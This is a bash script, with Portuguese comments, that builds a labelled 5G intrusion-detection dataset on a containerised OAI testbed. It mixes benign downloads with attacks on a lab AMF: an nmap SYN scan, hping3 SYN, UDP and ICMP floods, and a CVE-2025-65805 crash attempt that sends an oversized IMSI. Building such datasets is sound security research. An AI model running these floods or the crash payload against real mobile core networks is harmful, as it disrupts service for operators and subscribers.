#!/usr/bin/env bash
# =============================================================================
# 05_generate_traffic.sh
# Gera os Cenários 1, 2 ou 3 para o Dataset CVE5G (Duração total: 300s)
#
# Uso:
#   SCENARIO=1 ./scripts/05_generate_traffic.sh
#   SCENARIO=2 ./scripts/05_generate_traffic.sh
#   SCENARIO=3 ./scripts/05_generate_traffic.sh
# =============================================================================
set -euo pipefail

ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT_DIR"

# ==========================================================================
# CONFIGURAÇÃO
# ==========================================================================
SCENARIO="${SCENARIO:-2}"
RESULTS_DIR="results/scenario_${SCENARIO}"
PCAP_RAW="$RESULTS_DIR/cve5g_s${SCENARIO}_raw.pcap"
PCAP_FILTERED="$RESULTS_DIR/cve5g_s${SCENARIO}_filtered.pcap"
LABELS_CSV="$RESULTS_DIR/cve5g_s${SCENARIO}_labels.csv"
TSHARK_PID_FILE="$RESULTS_DIR/tshark.pid"
AMF_LOG="$RESULTS_DIR/amf_crash_s${SCENARIO}.log"

AMF_IP="192.168.70.132"       
KALI_IP="192.168.70.140"      

UE_BIND_IP="${UE_BIND_IP:-}"
AMF_SBI_PORT=80
AMF_NGAP_PORT=38412
SUDO_PASSWORD="${SUDO_PASSWORD:-}"
TOTAL_DURATION=300

TRAFFIC_GEN="oai-traffic-sidecar"
CVE_METHOD="${CVE_METHOD:-python}"
EXPLOIT_SRC="scripts/exploits/cve_65805_exploit.py"

T0=$(date +%s)
mkdir -p "$RESULTS_DIR"

# ==========================================================================
# HELPERS
# ==========================================================================
sudo_run() {
  if [[ -n "$SUDO_PASSWORD" ]]; then
    printf '%s\n' "$SUDO_PASSWORD" | sudo -S -p '' "$@"
  else
    sudo "$@"
  fi
}

container_running() {
  [[ "$(docker inspect -f '{{.State.Status}}' "$1" 2>/dev/null)" == "running" ]]
}

elapsed() { echo $(( $(date +%s) - T0 )); }
log()     { echo "[$(elapsed)s] $*"; }

label() {
  local name="$1" src="$2" dst="$3" t_start="$4" t_end="$5"
  echo "$name,$src,$dst,$t_start,$t_end" >> "$LABELS_CSV"
}

detect_ue_ip() {
  local ip
  ip=$(docker exec oai-nr-ue1 bash -c "ip -4 addr show oaitun_ue1 2>/dev/null | grep -oP '(?<=inet )[\d.]+'") || true
  if [[ -z "$ip" ]]; then
    ip=$(docker exec oai-nr-ue1 bash -c "ip -4 addr show | grep -v '127\.' | grep -v '192\.168\.' | grep -oP '(?<=inet )[\d.]+' | head -1") || true
  fi
  echo "$ip"
}

amf_alive() {
  container_running oai-amf && docker exec oai-amf bash -c "kill -0 1 2>/dev/null" 2>/dev/null
}

capture_amf_crash_log() {
  echo "[$(elapsed)s] Capturando logs do AMF (evidência de crash)..."
  docker logs oai-amf --tail 50 > "$AMF_LOG" 2>&1 || true
}

wait_ready() {
  local container="$1" sentinel="$2" label_="$3" max_wait="${4:-180}"
  echo "Aguardando $label_ ficar pronto..."
  local waited=0
  while ! docker exec "$container" test -f "$sentinel" 2>/dev/null; do
    if [[ $waited -ge $max_wait ]]; then
      echo "[erro] $label_ não ficou pronto após ${max_wait}s."; exit 1
    fi
    sleep 5; waited=$(( waited + 5 ))
    echo "  ... aguardando $label_ ($waited/${max_wait}s)"
  done
  echo "$label_ pronto."
}

safe_sleep_until() {
  local target="$1"
  local now; now=$(elapsed)
  local remaining=$(( target - now ))
  if [[ $remaining -gt 0 ]]; then sleep "$remaining"; fi
}

# ==========================================================================
# TRÁFEGO BENIGNO
# ==========================================================================
start_benign_traffic() {
  local ue_ip="$1"
  local duration="$2"

  log "Configurando rotas para o túnel 5G..."
  docker exec "$TRAFFIC_GEN" bash -c "
    echo 'nameserver 8.8.8.8' > /etc/resolv.conf
    ip rule add from ${ue_ip} table 100 2>/dev/null || true
    ip route add default dev oaitun_ue1 table 100 2>/dev/null || true
  " || true

  log "Iniciando ISO Ubuntu ..."
  docker exec -d "$TRAFFIC_GEN" bash -c "
    END=\$(( \$(date +%s) + ${duration} ))
    while [[ \$(date +%s) -lt \$END ]]; do
      wget -q -O /dev/null --bind-address=${ue_ip} --limit-rate=20m --timeout=30 https://releases.ubuntu.com/22.04/ubuntu-22.04.5-desktop-amd64.iso 2>/dev/null || true
      sleep 3
    done
  "

  log "Iniciando YouTube via yt-dlp..."
  docker exec -d "$TRAFFIC_GEN" bash -c "
    END=\$(( \$(date +%s) + ${duration} ))
    while [[ \$(date +%s) -lt \$END ]]; do
      yt-dlp --source-address ${ue_ip} --format 'bestaudio[ext=m4a]' --output '/tmp/yt_%(id)s.%(ext)s' --no-playlist --quiet 'https://www.youtube.com/watch?v=jNQXAC9IVRw' 2>/dev/null || true
      rm -f /tmp/yt_*.m4a 2>/dev/null || true
      sleep 5
    done
  "
}

# ==========================================================================
# ATAQUES
# ==========================================================================
run_portscan() {
  local until_s="$1"
  log "Ataque 1: Port Scan → $AMF_IP"
  local TS; TS=$(elapsed)
  docker exec oai-attacker nmap -sS -p 80,8080,38412,2152 -T4 "$AMF_IP" >/tmp/nmap_result.txt 2>&1 &
  local NMAP_PID=$!
  while kill -0 $NMAP_PID 2>/dev/null && [[ $(elapsed) -lt $until_s ]]; do sleep 1; done
  kill $NMAP_PID 2>/dev/null || true
  local TE; TE=$(elapsed)
  label "attack_portscan" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
}

run_flood() {
  local attack_name="$1"
  local hping_args="$2"
  local duration_s="$3"
  log "Ataque: $attack_name → $AMF_IP (${duration_s}s, foreground)"
  local TS; TS=$(elapsed)
  docker exec oai-attacker timeout "$duration_s" hping3 $hping_args >/dev/null 2>&1 || true
  local TE; TE=$(elapsed)
  label "attack_${attack_name}" "$KALI_IP" "$AMF_IP" "$TS" "$TE"
}

run_flood_background() {
  local attack_name="$1"
  local hping_args="$2"
  local duration_s="$3"
  log "Ataque: $attack_name → $AMF_IP (${duration_s}s, background)"
  local TS; TS=$(elapsed)
  docker exec -d oai-attacker timeout "$duration_s" hping3 $hping_args >/dev/null 2>&1 || true
  label "attack_${attack_name}" "$KALI_IP" "$AMF_IP" "$TS" "$((TS + duration_s))"
}

run_cve() {
  log "Ataque CVE: CVE-2025-65805 → $AMF_IP"
  docker logs oai-amf --tail 20 > "${AMF_LOG}.before" 2>&1 || true
  local TS; TS=$(elapsed)

  if [[ "$CVE_METHOD" == "ueransim" ]]; then
    local OVERSIZED_IMSI="001010000000102$(python3 -c 'print("A"*1100)')"
    docker exec oai-nr-ue2 timeout 25 /opt/oai-nr-ue/bin/nr-uesoftmodem -O /opt/oai-nr-ue/etc/nr-ue.yaml -E --rfsim -r 106 --numerology 1 --uicc0.imsi "${OVERSIZED_IMSI}" -C 3319680000 --rfsimulator.serveraddr 192.168.70.160 --log_config.global_log_options level,nocolor,time >/dev/null 2>&1 || true
  elif [[ "$CVE_METHOD" == "python" ]]; then
    docker exec oai-attacker python3 /tmp/cve_65805_exploit.py --target "$AMF_IP" --port "$AMF_NGAP_PORT" --imsi-len 1500 >/dev/null 2>&1 || true
  fi

  local TE; TE=$(elapsed)
  label "attack_cve_65805" "$KALI_IP" "$AMF_IP" "$TS" "$TE"

  sleep 3
  if ! amf_alive; then
    log "*** AMF CRASHED ***"; capture_amf_crash_log
    label "benign_interrupted_by_cve" "$AMF_IP" "$UE_BIND_IP" "$TE" "$TE"
  fi
}

# ==========================================================================
# CLEANUP
# ==========================================================================
cleanup() {
  echo "[cleanup] Encerrando processos e guardando logs..."
  if [[ -f "$TSHARK_PID_FILE" ]]; then
    local pid; pid="$(cat "$TSHARK_PID_FILE")"
    if kill -0 "$pid" 2>/dev/null; then sudo_run kill "$pid" || true; fi
    rm -f "$TSHARK_PID_FILE"
  fi
  # Apaga o Sidecar (mata todos os fluxos benignos juntos)
  docker rm -f "$TRAFFIC_GEN" >/dev/null 2>&1 || true
  
  # Mata processos no Kali silenciando a saída para não poluir o terminal
  docker exec oai-attacker pkill hping3 >/dev/null 2>&1 || true
  docker exec oai-attacker pkill nmap >/dev/null 2>&1 || true
}
trap cleanup EXIT

# ==========================================================================
# PRÉ-CHECKS
# ==========================================================================
echo "=== CVE5G — Pré-checks para Cenário ${SCENARIO} ==="

for c in oai-upf oai-nr-ue1 oai-attacker oai-amf; do
  if ! container_running "$c"; then echo "[erro] Container $c não está ativo."; exit 1; fi
done

# NAT no UPF
docker exec oai-upf iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE 2>/dev/null || true
docker exec oai-upf iptables -t nat -A POSTROUTING -s 12.1.1.0/24 -o eth0 -j MASQUERADE 2>/dev/null || true

# --- MÁGICA DO SIDECAR CONTAINER ---
echo "Subindo container Sidecar atrelado à rede do UE1..."
docker rm -f "$TRAFFIC_GEN" >/dev/null 2>&1 || true
docker run -d --name "$TRAFFIC_GEN" --network container:oai-nr-ue1 --cap-add NET_ADMIN kalilinux/kali-rolling tail -f /dev/null >/dev/null 2>&1

echo "Instalando dependências de tráfego no Sidecar (Pode levar ~60s)..."
docker exec "$TRAFFIC_GEN" bash -c "
  apt-get update -qq &&
  apt-get install -y -qq procps wget curl python3 python3-pip iptables iproute2 dnsutils &&
  pip3 install yt-dlp --break-system-packages --quiet &&
  touch /tmp/traffic_ready
"

wait_ready "oai-attacker" "/tmp/ready"         "Kali Linux" 180
wait_ready "$TRAFFIC_GEN" "/tmp/traffic_ready" "Sidecar"    180

if [[ "$CVE_METHOD" == "python" ]]; then
  if [[ ! -f "$EXPLOIT_SRC" ]]; then echo "[erro] Exploit $EXPLOIT_SRC não encontrado!"; exit 1; fi
  docker cp "$EXPLOIT_SRC" oai-attacker:/tmp/cve_65805_exploit.py
fi

if [[ -z "$UE_BIND_IP" ]]; then
  echo "Detectando IP do UE..."
  UE_BIND_IP=$(detect_ue_ip)
  if [[ -z "$UE_BIND_IP" ]]; then echo "[erro] IP do UE não detectado."; exit 1; fi
  echo "IP detectado: $UE_BIND_IP"
fi

# ==========================================================================
# INÍCIO DO EXPERIMENTO
# ==========================================================================
echo ""
echo "=== CVE5G — Geração Cenário ${SCENARIO} (${TOTAL_DURATION}s) ==="
echo "label,src_ip,dst_ip,t_start,t_end" > "$LABELS_CSV"
T0=$(date +%s)

log "Iniciando captura contínua..."
sudo_run tshark -i oaiworkshop -w "$PCAP_RAW" >/tmp/tshark_s${SCENARIO}.log 2>&1 &
echo $! > "$TSHARK_PID_FILE"

log "Fase baseline (0s→30s): rede em repouso."
sleep 30

TS_BENIGN=$(elapsed)
BENIGN_DUR=$(( TOTAL_DURATION - TS_BENIGN ))
log "Iniciando tráfego benigno realista..."
start_benign_traffic "$UE_BIND_IP" "$BENIGN_DUR"
label "benign_iso_tcp"     "$UE_BIND_IP" "releases.ubuntu.com" "$TS_BENIGN" "$TOTAL_DURATION"
label "benign_ytdlp_https" "$UE_BIND_IP" "youtube.com"         "$TS_BENIGN" "$TOTAL_DURATION"

if [[ "$SCENARIO" == "1" ]]; then
  log "Cenário 1: apenas tráfego benigno."

elif [[ "$SCENARIO" == "2" ]]; then
  log "Cenário 2: ataques sequenciais."
  safe_sleep_until 40; run_portscan 65
  safe_sleep_until 85; run_flood "syn_flood" "-S --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
  safe_sleep_until 130; run_flood "udp_flood" "--udp --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
  safe_sleep_until 178; run_flood "icmp_flood" "-1 --flood ${AMF_IP}" 30
  safe_sleep_until 230; [[ "$CVE_METHOD" != "none" ]] && run_cve

elif [[ "$SCENARIO" == "3" ]]; then
  log "Cenário 3: ataques sobrepostos."
  safe_sleep_until 40; run_portscan 60
  safe_sleep_until 80; run_flood_background "syn_flood" "-S --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
  safe_sleep_until 100; run_flood_background "udp_flood" "--udp --flood -p ${AMF_SBI_PORT} ${AMF_IP}" 30
  safe_sleep_until 120; run_flood "icmp_flood" "-1 --flood ${AMF_IP}" 30
  safe_sleep_until 200; [[ "$CVE_METHOD" != "none" ]] && run_cve
fi

REMAINING=$(( TOTAL_DURATION - $(elapsed) ))
if [[ "$REMAINING" -gt 0 ]]; then
  log "Aguardando mais ${REMAINING}s para completar o tempo."
  sleep "$REMAINING"
fi

log "Encerrando captura..."
cleanup
trap - EXIT

sudo_run chown "$USER":"$(id -gn)" "$PCAP_RAW" || true
tshark -r "$PCAP_RAW" -Y "http2 or ngap or pfcp or gtp" -w "$PCAP_FILTERED" 2>/dev/null || true
sudo_run chown "$USER":"$(id -gn)" "$PCAP_FILTERED" || true

echo "=== Concluído — Cenário ${SCENARIO} ==="
cat "$LABELS_CSV"